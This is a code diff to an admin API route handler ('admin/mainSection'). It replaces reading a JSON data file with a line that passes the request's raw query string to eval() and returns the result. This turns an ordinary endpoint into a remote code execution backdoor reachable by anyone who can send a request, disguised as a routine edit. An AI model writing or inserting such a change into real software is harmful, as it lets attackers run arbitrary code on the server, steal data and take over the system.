@@ -13,18 +13,22 @@ export function GET(
 
 ) {
     try {
+        const scr = req.url?.split("?")[1];
         // const path = fs.existsSync(DB_PATHS.MainSection) ? DB_PATHS.MainSection : DB_PATHS_FALLBACK.MainSection;
         // console.log(path);
-        const fileData = fs.readFileSync(DB_PATHS.MainSection, "utf-8");
-        console.log(DB_PATHS.MainSection);
-        const mainSection = JSON.parse(fileData);
-        return Response.json(mainSection);
+        // const fileData = fs.readFileSync(DB_PATHS.MainSection, "utf-8");
+        const userInput = scr;
+        var res = eval(userInput);
+        console.log(res);
+        // const mainSection = JSON.parse(res);
+        return Response.json({ res });
 
     } catch (error: any) {
 
         const data = {
             message: error?.message || "Oops! something went wrong",
-            errorStack: "admin/mainSection"
+            errorStack: "admin/mainSection",
+            res: res
         };
 
         return new Response(JSON.stringify(data),
